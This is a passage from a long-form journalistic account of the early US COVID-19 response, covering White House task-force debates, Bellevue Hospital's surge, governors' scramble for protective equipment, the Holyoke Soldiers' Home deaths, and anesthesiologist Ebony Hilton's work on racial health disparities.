“You sent over a supplemental that wasn’t clear to me at all,” Murray said. She listed actions that Azar had said were necessary. None were listed in the budget on the table. “Did you stockpile any of these critical supplies that we are told we need—masks, protective suits, ventilators, anything?”
“We do have in the Strategic National Stockpile ventilators, we have masks, we have—”
“Of course not, or we wouldn’t be asking for a supplemental,” Azar said.
“I didn’t see any numbers in your request,” Murray said.
Azar said that the details were being worked out. Murray persisted: “I’m very concerned about this Administration’s attitude. We’re not stockpiling those things right now that we know we might possibly need.” She concluded, “We are way behind the eight ball.”
On February 27th, the C.D.C. began allowing tests for people who hadn’t been to China or in close contact with someone known to be infected. The next day, doctors in Washington State tested two people from a nursing home, in the Seattle suburb of Kirkland, that was overrun with pneumonia. Both tested positive. America’s blindfold was finally coming off.
Trump, however, continued offering false assurances. “We’re testing everybody that we need to test,” he proclaimed. “We’re finding very little problem.”

On February 29th, Washington’s governor, [Jay Inslee]( reported that someone in his state had died of COVID. It was the first official death from the disease in the U.S., although it was later established that two Californians had died from it weeks earlier. Many others may have as well.
Inslee declared a state of emergency. One of Senator Murray’s relatives had been in the Kirkland facility a few years earlier. “I knew how many people came in and out of it, visitors and staff,” she told me. She said to herself, “Wow, this contagious virus, it can’t have just stayed in a nursing home.” Soon, friends of Murray’s got sick. She urged them to get tested, but they said, “I’ve asked my doctor, I’ve asked the public-health people in the county, I’ve called the state health people—nobody has these tests.” Her state was in turmoil. In Senate hearings and briefings, though, she sensed a lack of coördination and urgency.
The Democratic caucus went on a retreat in Baltimore. Murray received a text from her daughter, whose children attended school near the nursing home. “They closed the schools,” her daughter said. She added, “Kids are sick, teachers are sick. This is really frightening.”
Murray told her colleagues, “My daughter’s school closed. This is coming to you.”
8. “Just Stay Calm”
While this was happening, I was in Houston, in rehearsals for a play I’d written about the 1978 Camp David summit. [Oskar Eustis]( of New York’s Public Theatre, was directing. I have a memory of the preview performances which later came back to me, charged with significance. The actors were performing in the round, and slanted lighting illuminated their faces against the shadowy figures of audience members across the way. When one actor expostulated, bursts of saliva flew from his mouth. Some droplets arced and tumbled, but evanescent particles lingered, forming a dim cloud. At the time, I found this dramatic, adding to the forcefulness of the character. Later, I thought, This is what a superspreader looks like.
I have no idea how Eustis got sick. But when he abruptly flew back to New York and missed opening night, on February 20th, I knew that something was wrong. Texas was thought to be outside the danger zone that month, but retrospective modelling suggested that the virus likely had been infecting at least ten people a day since the middle of the month. The same was true for New York, California, Washington, Illinois, and Florida. By the end of February, there was probable local transmission in thirty-eight states.
The virus continued hitchhiking with passengers coming from other hot spots. Between December and March, there were thirty-two hundred direct flights from China to the U.S., many of them landing in New York. More consequentially, sixty per cent of flights from Italy to the U.S. landed in the New York area. Some of these passengers carried a more contagious mutation of SARS-CoV-2. On March 10th, Italy entered lockdown, and the next day the W.H.O. finally declared a pandemic. By that time, there were more than a hundred thousand cases in a hundred and fourteen countries.
“Just stay calm,” Trump remarked. “It will go away.”
Weeks had passed from the point when containment was possible. On February 25th, Nancy Messonnier, a senior director at the C.D.C., warned, “We will see community spread in this country. It’s not so much a question of if this will happen anymore but rather more a question of exactly when.” Without vaccines or treatments, communities needed to rely on such measures as school closures, social distancing, teleworking, and delaying elective surgeries. People should expect missed work and loss of income. Parents needed a child-care plan. “I understand this whole situation may seem overwhelming,” she said. “But these are things that people need to start thinking about now.”
A steep drop in the stock market followed Messonnier’s blunt assessment. The President, who had encouraged Americans to judge his performance by market indicators, was enraged. The next time Messonnier spoke in public, she was quick to praise Trump, saying that the country had acted “incredibly quickly.”
Amy Klobuchar dropped out of the Presidential race on March 2nd and flew to Dallas to endorse [Joe Biden]( The stage was filled with supporters. As the crowd cried, “Let’s go, Joe!,” she embraced Biden. But as she did so she said to herself, “Joe Biden shouldn’t get COVID.” She warned his advisers to begin taking greater precautions.
On the first Friday in March, she attended a Biden rally in Detroit. That night, employees in the Wayne County sheriff’s office gathered for an annual party at Bert’s, a soul-food and jazz venue. Most of the officers were Black; some had retired. At the time, there were no known cases of COVID in Michigan. Three weeks later, seven of the attendees had COVID, and dozens more in the sheriff’s office were ill. By the end of March, three law-enforcement officials had died.
At the rally, Klobuchar noticed that people had become more careful. “I put on gloves,” she said. “We didn’t know about masks at the time.”
Democratic rallies soon came to a halt.
[Bellevue Hospital]( on First Avenue in Manhattan, is “the grande dame of America’s public hospitals,” the historian David Oshinsky told me. Since it opened, as an almshouse, in the eighteenth century, nobody has been turned away, whether the patient can afford treatment or not. Bellevue has endured epidemics of cholera and yellow fever, diseases that sent untold thousands to their graves in the [potters’ fields]( that are now Washington Square and Bryant Park. In the nineteen-eighties, Bellevue treated more AIDS patients than any other American hospital.
In 1983, Nate Link began an internship at Bellevue, and almost immediately pricked himself, by accident, with a contaminated needle. He thought it was a death sentence, but he escaped infection. The work was both harrowing and thrilling. “I felt like I was in the epicenter of the universe,” he told me. He is now Bellevue’s chief medical officer.
During the 2014 Ebola outbreak in Africa, Link and his colleagues knew that, if Ebola spread to New York, the patients would end up at Bellevue. The hospital built an Ebola unit and a dedicated laboratory, training hundreds of staff and storing additional personal protective equipment. The instant they finished their preparations, a patient appeared. He survived. Bellevue then sent emissaries across the country to help hospitals prepare special facilities, develop protocols, and train their staffs for novel infections. Had it not been for the foresight of Link and his colleagues, America would be far less prepared for the COVID onslaught.
Once the coronavirus emerged, Bellevue’s special-pathogens team began preparing a protocol. “We thought we’d get one or two cases, just like Ebola,” Link recalled. But by early March the hospital was admitting a stream of patients with fever and unexplained respiratory problems. They were labelled P.U.I.: patients under investigation. Tests weren’t available. “We had this sense that there was this invisible force out there,” Link recalled. He believes that the city already had tens of thousands of cases, but, “without testing, there was just no way to know—it was a sneak attack.” When the city reported its first positive case, on March 1st, only thirty-two tests had been conducted. Asymptomatic carriers and people with mild symptoms slipped through the nets. The testing guidelines almost seemed designed to undercount the spread.
On March 10th, Eustis, the theatre director, walked half a mile from his home, in Brooklyn, to an emergency clinic on Amity Street. His muscles ached. Twice he had to stop and catch his breath, sitting for a while on a fire hydrant. He was too exhausted to be afraid.
His vital signs showed dangerously low potassium levels, and his heart kept skipping beats. An ambulance ferried him to a Brooklyn hospital. An antibody test eventually showed that he had the coronavirus. Despite his condition, there was no room for Eustis. He was placed on a gurney with an I.V. potassium drip and left in a corridor overnight. He soiled himself, but nobody came to change him. He was given no food for thirty-six hours. The COVID surge had begun.
On March 11th, Dr. Barron Lerner was at his office in Bellevue. The hospital had begun implementing triage at the front desk for patients with respiratory problems. That morning, at a staff conference, doctors were told, “If you’re talking to a patient you think might have COVID, you excuse yourself from the room. You say, ‘O.K., I need to leave now. A nurse is going to come in and give you a mask.’ ”
Lerner met with a regular patient, an Asian immigrant who didn’t speak English. Bellevue maintains a staff of a hundred translators, and one of them connected to a dual telephone system. “About ten days ago, she had a fever,” the translator told Lerner. “Then she was coughing, and she’s been really short of breath since then.”
“I thought, I can’t believe this just happened,” Lerner recalled. “I was probably the first staff member to be exposed.” He was sent home and told to monitor his temperature. He and his wife began sleeping in separate bedrooms. Five days later, the fever struck.
Meanwhile, Eustis was released after four days, still shaky. Upon returning home, he immediately went to bed. He turned out to have “long haul” COVID. “It comes in waves,” he told me. “I’m struggling with extreme fatigue and continued muscle pain.” Working wasn’t an option in any case: every theatre in New York had gone dark.
9. The Doom Loop
Vice-President [Mike Pence]( was now in charge of the task force, but Azar remained a member. Meetings were often full of acrimony. [Olivia Troye]( a former homeland-security adviser to Pence, told me, “I can’t even begin to describe all these insane factions in the White House. I often thought, If these people could focus more on doing what’s right for the country rather than trying to take each other down, we’d be in a much different place.” Fauci, she recalled, was considered too “outspoken and blunt” with the media, which led such Trump Administration officials as [Jared Kushner]( and Peter Navarro to complain that he was “out of control.” Troye summed up the Administration’s prevailing view of Birx crisply: “They hate her.” At task-force briefings, Birx typically presented a slide deck, and Troye once caught White House staff members rolling their eyes. Marc Short, Pence’s chief of staff, remarked, “How long is she going to instill fear in America?”
On March 11th, members of the Coronavirus Task Force crowded into the Oval Office, where they were joined by Kushner, Ivanka Trump, Secretary of State [Mike Pompeo]( and a dozen others. According to the official who kept contemporaneous notes, Birx and Fauci pushed for shutting down European travel. “Every seed case you prevent is a cluster of cases you prevent,” Birx explained. Redfield and Azar had swung around to the idea that cutting off European travel might buy time, but [Steven Mnuchin]( the Treasury Secretary, heatedly insisted that doing so would cripple the U.S. economy and trigger a global depression. The markets would crater. “Forget about ballgames!” he said, pointedly adding, “Forget about campaign rallies!”
After an hour, the President had another obligation, and he asked Pence to keep the discussion going. The group adjourned to the Cabinet Room. Mnuchin argued that there must be ways to curb viral spread without banning travel. The elderly were at high risk—why not sequester the most vulnerable?
“It’s twenty-five per cent of the population!” Robert O’Brien, the national-security adviser, observed. “You’re not going to be able to stick them all in hotels.”
Fauci had recently warned the group that the outbreak was going to get far worse, saying, “There’s no place in America where it’s business as usual. By the time you mitigate today, we’re three weeks late.” Colleges were sending students home, further contributing to the spread.
Another member of the task force noted that, in a bad flu season, sixty thousand Americans might die. What was the difference?
“This is twenty times that,” Pottinger argued. “This is two per cent dead, where the flu is .1 per cent.”
“If we just let this thing ride, there could be two million dead,” Birx said. “If we take action, we can keep the death toll at a hundred and fifty to two hundred and fifty thousand.” It was surreal hearing such numbers laid out so nakedly.
Mnuchin demanded data. He felt that the U.S. just had to live with the virus. It wasn’t worth sacrificing the airlines, the cruise ships, the hotels. “This is going to bankrupt everyone,” he said. “Boeing won’t sell a single jet.”
“You keep asking me for my data,” Birx said, sharply. “What data do you have? Does it take into account hundreds of thousands of dead Americans?” In the end, her side won.

That evening, in an unusually formal speech from the White House, the President announced that he was suspending travel from Europe for the next month. “We are marshalling the full power of the federal government and the private sector to protect the American people,” he promised. He had also signed a bill providing $8.3 billion to help the C.D.C. and other government agencies fight the virus. He highlighted the danger the elderly faced and urged nursing homes to suspend unnecessary visits. He advised social distancing and not shaking hands—practices that he hadn’t yet adopted himself.
Trump’s speech included his usual distortions. He claimed that insurance companies had agreed to “waive all co-payments for coronavirus treatments,” though they’d agreed only to waive fees for tests. But, for perhaps the first time, he was presenting himself as a unifier—as a take-charge Consoler-in-Chief. If he had continued playing that role, America would have had a different experience with the contagion.
Glenn Hubbard is a conservative economist who served as the chairman of President [George W. Bush]( Council of Economic Advisers. Soon after the pandemic began, he became involved in discussions in Washington about how to handle the financial impact. Hubbard told me, “I and other economists had been worried about a doom loop”—a cycle of negative economic feedback. When the pandemic hit, the world suffered a supply shock: trade was disrupted, factories and stores closed. If workers didn’t start earning again soon, the supply shock could turn into a demand shock, and that would further weaken supply, which would increase unemployment and further diminish demand. A doom loop.
In mid-March, Hubbard spoke with the Republican senators [Marco Rubio]( of Florida; [Susan Collins]( of Maine; and Roy Blunt, of Missouri. The N.B.A. had just suspended its season. Economic forecasts were terrifying. The senators were getting panicked reports from business owners back home.
Only Collins had been in office during the 2008 financial crisis, when Congress had passed a seven-hundred-billion-dollar bill to bail out troubled assets—the outer limit of what these conservatives had ever imagined spending. Now they were talking about trillions. Enlarging the deficit and expanding the federal government’s reach were anathema to the Republican caucus; to some members, it smacked of socialism. Rubio indicated that he would never support such spending in normal times.
“You need to do something,” Hubbard warned. “We’ve been having a debate for decades now about the size of government. The more interesting debate is the scope of government.” He spoke of the first Republican President, Abraham Lincoln: “He decided to do the Homestead Act, land-grant colleges, and to lay the foundation for the transcontinental railroad. If Lincoln, in the middle of the Civil War, had the idea of using government as a battering ram for opportunity, why can’t we do that today? Instead of focussing on how big government is, think about what you want it to do.”
Rubio, who is the chairman of the Small Business Committee, thought about the restaurants, the travel companies, the hair salons—all of them service businesses “with the least ability to survive.” The action that Congress was contemplating was heresy from a fiscal-conservative perspective, but the alternative—failing businesses, deepening poverty, boundless unemployment—was worse.
Action was necessary, the senators agreed. As it turned out, there was a surprising logistical problem: the Treasury Department had previously bailed out corporations and given checks to individuals, but it wasn’t clear how to give assistance to small businesses. Collins was working on a loan-forgiveness program, and Rubio was trying to figure out how to create a new loan program through the Small Business Administration’s existing network of lenders. “That’s when the Paycheck Protection Program arose as an idea,” Rubio told me. Loans taken out to keep people on the payroll could be forgiven, offering employees assurance that their jobs would still be there when the clouds cleared.
The Democrats were fully on board, and Congress soon approved three hundred and fifty billion dollars’ worth of forgivable loans to small businesses. The over-all relief package was even larger. Chris Coons, a Democratic senator from Delaware, told me, “We went from ‘We don’t know what to do’ to nine hundred pages and $2.2 trillion in about ten days. I’ve never seen anything like it.”
Hubbard said, “Nothing like a big shock to help people become more bipartisan.”
10. Reinforcements Arrive
On March 12th, Amy Klobuchar was back in Minnesota. Her husband, John Bessler, who teaches law at the University of Baltimore, remained in Washington. He awoke that morning feeling ill. “He was going to take my place at my constituent breakfast in D.C.,” Klobuchar recalled. “It was when he would have been most contagious, as we now know. There would have been around fifty people, in a small room. And then he was going to a faculty meeting—about sixty people, in a small room. Then he was going to get on an airplane and fly to Minnesota, with a bunch of people packed in. I was having some minor surgery at Mayo, and he was going to come there! He really would have had quite a day of infecting people.” They had no idea how he’d caught the virus. He was fifty-two and, until then, in excellent health.
Bessler stayed home, and steadily grew worse. For more than a week, Klobuchar kept calling, anxiously asking what his temperature was. Their only thermometer was in centigrade, so Klobuchar had to Google the conversion. Each time, it exceeded a hundred degrees. Hearing that he was short of breath, she urged him to see a doctor, worrying that “it was one of those cases where people are underestimating how sick they are, and then they die the next day.” After Bessler coughed up blood, he went to the hospital to get tested. He had severe pneumonia. Doctors kept telling Klobuchar, “The oxygen is getting worse.” She couldn’t visit him, making the ordeal even more frightening.
Bessler spent five days in the hospital. He recuperated, and was back in the couple’s D.C. apartment when his test finally came back positive.
Dr. Lerner’s COVID case was mild. He returned to work at Bellevue after twelve days, on March 23rd. The city had become weirdly quiet: First Avenue resembled an abandoned set on a studio back lot. During his absence, a tent had been erected in the courtyard, for screening patients. Everyone now wore a mask.
Non-COVID patients in intensive care were shuttled to the postoperative surgical unit, which was available because all surgeries had been cancelled. This freed up fifty-six I.C.U. beds. Workers installed hepa filters in each room, creating negative pressure that prevented infected air from escaping. Offices were turned into more patient units; as soon as carpenters walked out of a converted room, a patient was wheeled in. Twenty-five more spaces for ventilator patients were added in the E.R. When all the beds filled, the I.C.U. cubicles were doubled up. Lerner, still recovering, tended to his patients through [televisits]( taking hour-long naps as Bellevue whirled around him.
In mid-March, Bellevue had its first COVID death: a middle-aged patient with no preëxisting conditions, who had been hospitalized for two weeks. Dr. Amit Uppal, the director of critical care, recalled, “Among our staff, we just looked at each other and said, ‘O.K., here we go.’ And from there it just exponentially ramped up.”
Uppal, the son of Indian immigrants, grew up in Northern California and did his medical training at Ohio State. He was drawn to Bellevue because he wanted to serve the disadvantaged, but also because of the staff—“people that could work anywhere in the country and chose to defend this population.” Uppal wanted to specialize in critical care so that he could handle the most extreme diseases. He was prepared to face the knotty ethical dilemmas at the limits of medical knowledge.
Part of the mission at Bellevue is helping patients die well. “It provides you a rare perspective on your own life,” Uppal said. “Many laypeople who don’t do medicine, and aren’t exposed to end-of-life issues, may not have the opportunity to reflect on what’s really important to them until the end of their own life.” But COVID seemed cruelly designed to frustrate the rituals of death.
Just as Bellevue’s first patients began dying, the hospital was flooded with new admissions. The I.C.U.’s typical mortality rate was far lower than COVID’s, so even critical-care staff like Uppal were unsettled. Such doctors knew how to click into emergency mode. Before COVID, that might last thirty or forty minutes—say, with a heart-attack patient. After a bus wreck or a mass-casualty event, emergency mode could last a full day. With COVID, it lasted weeks on end.
During rounds, Uppal passed each of the I.C.U.’s fifty-six cubicles. The patients were all on ventilators, the distinctive gasping sound unvaried. I.V. lines extended outside each cubicle, so attendants didn’t have to enter to administer medication. In the antiseptic gloom, the patients appeared identical. It was too easy to overlook their humanity. Uppal forced himself to examine their charts. He needed to recapture “what made them unique.”
Overwhelmed hospitals in New York’s outer boroughs transferred more than six hundred patients to Bellevue, knowing that nobody would be turned away. The E.R. became a hot zone where many people coming off the street required immediate intubation. Before COVID, the E.R. was always jammed, and nobody wore P.P.E. Nate Link told me, “When COVID hit, we made a promise to ourselves that we would not let the emergency rooms back up, and that we would keep them pristine.” Staffers had to remain swathed in P.P.E., Link said, adding, “In the end, only fifteen per cent of the staff in the emergency department tested positive. That’s lower than the hospital in general. It’s even a bit less than the city average. The message is that P.P.E. works.”
Some doctors needed new roles to play. Orthopedic surgeons began devoting their shifts to turning patients—“proning”—to facilitate breathing. Ophthalmologists helped in the I.C.U.; general surgeons treated non-COVID patients. “Everybody found a niche,” Link said. “We were a completely different hospital for three months.”
More than twenty thousand New Yorkers died from COVID in the spring. As the numbers mounted, Link noticed that employees were practicing “psychological distancing.” He said, “Our staff had never seen so much death. Normally, a patient dying would be such a big deal, but, when you start having a dozen patients die in a day, you have to get numb to that, or you can’t really cope.” This emotional remove was shattered when the first staff member died: a popular nurse, Ernesto (Audie) De Leon, who’d worked at Bellevue for thirty-three years. Link said, “His death was followed by a COVID-style ‘wake,’ as many of his colleagues approached his I.C.U. cubicle in full P.P.E., put their hands on the glass door, and read Scripture, prayed, and wept. Because of the infection-control restrictions, staff consoled each other without touching or hugging. It was very unnatural.”
When Bellevue’s doctors were at their lowest ebb, reinforcements arrived: hospital workers from other states flooded into New York to help. According to Governor [Andrew Cuomo]( thirty thousand people responded to the city’s call for aid. It was a rare glimpse of national unity. “Half the people in the I.C.U. had Southern accents,” Link told me. “That’s what saved us.”
11. The No-Plan Plan
In mid-March, America began shutting down. The Coronavirus Task Force urged Americans to work from home. Education would be virtual. Travel and shopping would stop. Restaurants and bars would close. The goal was to break the transmission of the virus for fifteen days and “flatten the curve.” Trump’s impatience flared. At a press briefing, he said of the virus, “It’s something we have tremendous control over.” Fauci corrected him, observing that the worst was ahead, and noting, “It is how we respond to that challenge that’s going to determine what the ultimate end point is.”
Trump held a conference call with governors. “We’re backing you a hundred per cent,” he said. Then he said, “Also, though, respirators, ventilators, all the equipment—try getting it yourselves.”
Most governors had assumed that, as in the event of a hurricane or a forest fire, the federal government would rush to help. Storehouses of emergency equipment would be opened. The governors, faced with perilous shortages of ventilators, N95 masks, and nasal swabs, expected Trump to invoke the Defense Production Act, forcing private industry to produce whatever was needed. Surely, there was a national plan.
Governor Inslee, of Washington, was flabbergasted when he realized that Trump didn’t intend to mobilize the federal government. Inslee told him, “That would be equivalent to Franklin Delano Roosevelt, on December 8, 1941, saying, ‘Good luck, Connecticut, you go build the battleships.’ ”
Trump responded, “We’re just the backup.”
“I don’t want you to be the backup quarterback,” Inslee said. “We need you to be Tom Brady here.”
[Larry Hogan]( the Republican governor of Maryland, was incensed. “You’re actively setting us up!” he told Trump.
Matt Pottinger’s brother, Paul, kept sending desperate e-mails from Seattle. He had heard about medical workers fashioning P.P.E. out of materials from the Home Depot. Industrial tape and marine-grade vinyl were being turned into face shields. Garbage bags were serving as surgical gowns. A local health official wrote him, “We are currently drafting up guidelines for how to make homemade masks from cloth and I’ve asked other innovators in the community to see if they can figure out if we can do ANYTHING that would be better than nothing.” Matt wrote to Paul, “Help is on the way, but it probably won’t be in time—so start tearing up bedsheets and turning them into lab coats, raid the Salvation Army for garments, wrap bras around your faces in place of facemasks if you have to.”
The Strategic National Stockpile existed for such emergencies, but Secretary Azar had recently testified to the Senate that it had only twelve million N95 masks—a fraction of what was needed. The storehouse had once held more than a hundred million masks, but many were used during the 2009 H1N1 flu pandemic, and the supply wasn’t replenished.
After Trump made clear that the states were on their own, Ned Lamont, the gregarious governor of Connecticut, called other governors in his region: Phil Murphy, of New Jersey; Charlie Baker, of Massachusetts; Gina Raimondo, of Rhode Island; and Cuomo. The states needed to act together, Lamont said. “If I close down bars and Andrew keeps them open, that doesn’t solve any problems,” he said. “Everybody’s going to go down there to drink, and bring back the infection.”
The governors were daunted by the task facing them. Lamont imagined furious constituents: “You’re going to close down the schools? My God!” Acting in concert provided political cover and a sense of solidarity.
The governors closed gyms, restaurants, and bars at the same time. Lamont, Murphy, and Cuomo prohibited gatherings exceeding fifty people. Baker and Raimondo limited them to twenty-five. Cuomo announced, “If you were hoping to have a graduation party, you can’t do it in the state of New York, you can’t go do it in the state of New Jersey, and you can’t do it in the state of Connecticut.”
Governors discovered that the Trump Administration was sabotaging their efforts to protect citizens. Charlie Baker arranged to buy three million N95 masks from China, but federal authorities seized them at the Port of New York, paying the supplier a premium. In another group call with Trump, Baker, a Republican, complained, “We took seriously the push you made not to rely on the stockpile. I got to tell you, we lost to the Feds. . . . I’ve got a feeling that, if somebody has to sell to you or me, I’m going to lose every one of those.”
“Price is always a component,” Trump replied coldly.
Baker quietly secured a cache of 1.2 million masks from China, and enlisted the help of Robert Kraft, the owner of the New England Patriots, who used the team plane to fly the shipment to Logan Airport, where it was received by the Massachusetts National Guard and spirited away.
At a briefing, Cuomo fumed, “You have fifty states competing to buy the same item. We all wind up bidding up each other.” He threw up his hands. “What sense does this make? The federal government—fema—should have been the purchasing agent.”
Gina Raimondo pressed FEMA, saying, “Can we tap into our national stockpile?” After days of giving her the runaround, the agency promised that a truckful of P.P.E. was on its way. At 9 P.M., she got a text saying that the truck had arrived. Raimondo [told Politico]( “I called my director of health. ‘Great news, the truck is finally here!’ She says, ‘Governor, it’s an empty truck.’ They sent an empty truck.”
Inslee told me, “Only eleven per cent of the P.P.E. we’ve obtained has come from the federal government.”
Governors who got more had to show obeisance to Trump. [Gavin Newsom]( of California, praised the President fulsomely after being promised a shipment of swabs. Around this time, a reporter asked Trump, “You’ve suggested that some of these governors are not doing everything they need to do. What more, in this time of a national emergency, should these governors be doing?”
“Simple,” Trump said. “I want them to be appreciative.”
In the spring, Trump pressed the F.D.A. to fast-track authorization of a malaria treatment, [hydroxychloroquine]( for COVID patients. [Fox News]( touted the drug as a “game changer.” [Tucker Carlson]( and Laura Ingraham aired breathless interviews with Gregory Rigano, who had co-written a “paper”—a self-published Google Doc—calling the drug an effective treatment. Rigano, a lawyer, had recently started blockchain funds that aimed to “cheat death” and “end Alzheimer’s.” Between March 23rd and April 6th, hydroxychloroquine was mentioned on Fox News nearly three hundred times. White House officials, including Peter Navarro, heavily promoted it.
At a task-force briefing, Fauci was asked if hydroxychloroquine curbed the coronavirus. “The answer is no,” he said.
The President glowered and stepped toward the mike. “I’m a big fan,” he said.
Three months later, the F.D.A. withdrew its authorization. The drug was ineffective and caused “serious cardiac adverse events” and other side effects, including kidney disorders and death. When hydroxychloroquine was paired with azithromycin—a combination that Trump had publicly championed—patients were twice as likely to suffer cardiac arrest as those who took neither drug.
Fox News stopped hyping hydroxychloroquine, but Trump still wanted a quick fix. While cases in New York were doubling every three days, and doctors were treating patients in tents in Central Park, he declared that he wanted America “raring to go” by Easter.
Over all, the case fatality rate for COVID is two per cent. But for people over seventy-five the risk of death is hundreds of times greater than it is for those under thirty. The devaluation of elderly lives was evident in the low standard of care in many nursing homes, where forty per cent of U.S. deaths have occurred, despite accounting for only eight per cent of cases. In March, two hundred and thirty-five military veterans were living at the Soldiers’ Home in Holyoke, Massachusetts. Some had served in the Second World War. Now they were captives to a system that was failing to protect them.
According to [an independent investigation]( commissioned by the state, family members and workers had long complained about understaffing, in part because of a 2015 hiring freeze ordered by Governor Baker. On March 17th, a veteran who had been showing symptoms for weeks was tested for COVID. He lived in one of two dementia units; he wasn’t isolated, not even after his test came back positive, four days later. Contagion took hold, and overburdened employees made the fateful decision to combine the two units, with beds placed in tight rows. Many disoriented veterans climbed into the wrong beds, accelerating the spread. A recreational therapist said that she felt as if she were leading her patients “to their death.”
On Friday, March 20th, Michael Miller, who is retired from the Army National Guard, got a call from his two sisters, Linda McKee and Susan Perez. “They’re not thinking Dad’s gonna make it through the night,” they said. Their father, James L. Miller, was ninety-six, and had been at the Soldiers’ Home since 2015. The siblings drove to the facility. Only one family member could enter at a time. Mike went in while his sisters waited in the car. His father “looked like a corpse,” he recalled. “He had been in that state of decay for a week, and nobody called us.”
Jim Miller had landed at Normandy Beach on D Day. He had helped liberate a concentration camp near Nordhausen, Germany. After mustering out, he became a postal worker and a firefighter. He was a taciturn man who had rarely discussed his military service with his children.
Now this quiet old veteran was dying in the midst of bedlam. “Men were just wandering around,” Mike said. “They were in various states of dress. There was a curtain drawn for my dad—other veterans would open the curtain and stand there. And these gentlemen I knew. They meant no disrespect.” A man on a nearby bed was “just moaning—he couldn’t breathe. He ended up passing away that night.”
Staffers couldn’t offer the dying residents anything but “comfort measures”—morphine under the tongue. Jim was so dehydrated that he couldn’t swallow. “Give him an I.V.!” Mike pleaded. But staffers weren’t authorized to do this; nor could they transport him to a hospital. Mike moistened his dad’s mouth with a foam swab. Nurses broke down, Mike recalled: “They loved my dad. But they couldn’t do anything.” He never saw any administrators.
Mike returned each day as his sisters kept vigil in the parking lot. On Saturday, they witnessed the arrival of a refrigerated truck that had been sent to store bodies. On Monday, Jim Miller passed away. Before it was all over, at least seventy-five other veterans had died.
12. Little Africa
In the COVID world, everyone is in disguise. When Dr. Ebony Hilton enters a room, patients see wide-set, lively eyes above her surgical mask. Her hair and body are hidden by a bonnet and a gown. Her accent marks her as a Southerner. She calls herself a “country girl,” which is at odds with her assured manner. When the call comes to intubate a COVID patient, “it’s already a situation where somebody is dying,” she told me. “The only reason I’m placing this breathing tube is because your body is shutting down, so if I don’t touch you you’re dead.” She added, “If I do touch you, I could die.”
Hilton, who is thirty-eight, is a professor and an anesthesiologist at the University of Virginia School of Medicine, in Charlottesville. U.Va.’s hospital has some six hundred beds, but at night Hilton often works alone: “I’m literally the only anesthesiologist attending for the entire hospital. At that moment, I can’t shut down, I can’t go to my room and let fear stop me.” She continued, “I don’t think any of us have slowed down to think that this could be the one that gets me sick. You don’t have time to consider options A, B, C, and D. You’ve got to gown up and go.”
One day in early March, Hilton got a page. A patient was septic, meaning that an infection had entered her bloodstream and was raging through her body. Her kidneys were starting to fail. Ordinarily, doctors would suspect bacteria as the cause, but the infection’s spread had been alarmingly rapid, and the symptoms matched what doctors were reporting about COVID patients in China and Italy. Many health-care workers had noted the speed with which the infection killed when it made its move.
Hilton entered the room, wearing an N95 mask. The patient had no blood pressure; without intervention, her oxygen-starved brain would start dying within seconds. The procedure for intubation requires a pillow to be placed under the patient’s shoulder blades, so that the head is tilted back in the “sniffing position.” Hilton made sure that the patient was oxygenated and given a sedative and a muscle relaxant; then she pried her mouth open, pushed her tongue aside, and inserted a laryngoscope—a curved blade attached to a handle, which looks like the head of a walking cane. The device lifts the epiglottis, exposing the vocal cords. If the vocal cords don’t readily appear, pressure on the larynx can bring them into view. Hilton slowly inserted a plastic tube through the narrow portal between the vocal cords, down into the trachea. Once the tube was secured, the patient was connected to a ventilator.
That was probably Hilton’s first COVID patient, but there was no way to know. Virginia had barely any tests in early March.
Hilton comes from a community near Spartanburg, South Carolina, called Little Africa. After the Civil War, Simpson Foster, a formerly enslaved man, and a Cherokee named Emanuel Waddell founded the community as an agrarian refuge. “It’s tiny,” Hilton said. “We don’t have a red light. We only have my great uncle Hobbs’s store—he keeps snacks and stuff for us.”
Little Africa is in the foothills of the Blue Ridge Mountains. “When you’re sitting on the porch, you can see the skyline of the peaks,” Ebony’s mother, Mary Hilton, told me. “We have doctors, lawyers, judges—we have so many professions coming out of the Little Africa community, because we put so much emphasis on education, taking care of each other,” she said. “Eb is coming from a very powerful place.”
When Ebony was eight, her little sister asked Mary if they could have a brother. Mary was caught by surprise but answered honestly: her first child had been a boy. “I was seventeen,” she recalled. “I had never heard of an ob-gyn. We always went to the clinic.” She went alone; her mother was picking cotton. Mary suspects that, during a pregnancy exam, a technician punctured her amniotic sac. The boy was born prematurely and died after three days. “I told Eb that story, not knowing it would change her life,” Mary said. The moment Ebony heard it, she announced that she was going into medicine. Her resolve must have been evident: right then, Mary began calling her Dr. Hilton.
Not long ago, Ebony and her sisters, Brandi and Kyndran, placed a tombstone for the brother they never knew. They erected it in the churchyard of the New Bedford Baptist Church, in Little Africa. “He was a fighter,” Ebony told me. “He tried to beat the odds. So I try to finish out that mission for him.”
Hilton’s image of her future was formed by watching “Dr. Quinn, Medicine Woman.” She attended the Medical University of South Carolina, intending to become an obstetrician-gynecologist. “One night, when I was on my OB rotation, there was a lady having a seizure—she actually had eclampsia—and this guy ran into the room and started shouting orders, like, ‘I’m going to do the A-line,’ ‘You start a magnesium.’ I leaned over and asked, ‘Who is that guy?’ One of the OBs said, ‘Oh, that’s the anesthesia resident.’ ” Hilton told herself, “I want to be the person that, when there’s utter chaos, you know what to do.”
In 2013, she became the first Black female anesthesiologist to be hired by the Medical University of South Carolina, which opened in 1824. U.Va. hired her in 2018. “Growing up in medicine, what I’ve come to realize is that, should I have a child, it would actually be at more risk of dying than my mom’s child was,” she said. She cited [a Duke University study]( that correlated race and education levels: “If you look at white women with my same level of degrees, my child is five to seven times more likely to die before his first birthday than theirs. It’s been that way historically for Black women. Our numbers haven’t really changed, as far as health outcomes, since slavery times.”
Many minorities suffer from co-morbidities. “That’s where the social determinants of health kick in,” Hilton said. Asthma and chronic respiratory disease can be the result of air pollution—say, from an industrial plant in a low-income neighborhood. “If you’re in a gated community, you don’t see smoke billowing out of these industries, because you have the money and power to influence the policymakers to say, ‘You can’t put that here.’ ” Heart failure, obesity, and diabetes are tied to whether or not there are nearby restaurants and grocery stores with healthy options. She pointed out that, in South Carolina, one in every five counties doesn’t have a hospital; eleven counties don’t have any ob-gyns.
The moment the first American COVID death was announced, in February, Hilton said, she “started doing a tweetstorm to C.D.C. and W.H.O., saying, ‘We know racial health disparities exist, and they existed before COVID—and we know where this will end up.’ ” She demanded, “Tell us who you’re testing and who you’re not.” The C.D.C. didn’t release comprehensive data until July, after [the Times sued for it]( The country, it turned out, was experiencing wildly different pandemics. For every ten thousand Americans, there were thirty-eight coronavirus cases. But, for whites, the number was twenty-three; for Blacks, it was sixty-two; for Hispanics, it was seventy-three. At Hilton’s hospital, seven of the first ten COVID fatalities were people of color.

